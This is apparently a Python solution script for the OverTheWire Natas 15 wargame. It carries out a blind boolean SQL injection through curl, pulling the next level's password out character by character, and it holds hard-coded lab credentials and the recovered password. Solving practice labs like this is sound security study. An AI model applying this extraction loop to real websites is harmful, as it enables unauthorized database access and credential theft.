import os

payload = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"
access = "curl 'http://natas15.natas.labs.overthewire.org/index.php'   -H 'Authorization: Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA=='   -H 'Connection: keep-alive'   -H 'Origin: http://natas15.natas.labs.overthewire.org'   -H 'Referer: http://natas15.natas.labs.overthewire.org/index.php?debug'   -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'   -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'   -H 'accept-language: en-US,en;q=0.9'   -H 'cache-control: max-age=0'   -H 'content-type: application/x-www-form-urlencoded'   -H 'dnt: 1'   -H 'sec-gpc: 1'   -H 'upgrade-insecure-requests: 1'  --insecure"

password = ""
tried_right = False
while len(password) < 32:
    found = False
    for char in payload:
        if not tried_right:
            test_password = password + char
        else:
            test_password = char + password
        command = "--data-raw 'username=natas16%22AND+password+LIKE+BINARY+%22%25{}%25%' ".format(test_password)
        full_command = access + " " + command
        response = os.popen(full_command).read()
        print(test_password)
        if "This user exists." in response:
            password = test_password
            print("Testing character:", char)
            found = True
            break
    if not found:
        print("Failed to find next character.")
        if not tried_right:
            tried_right = True
        else:
            password = payload[0] + password

print("Generated password:", password)
# hPkjKYviLQctEW33QmuXL6eDVfMW4sGo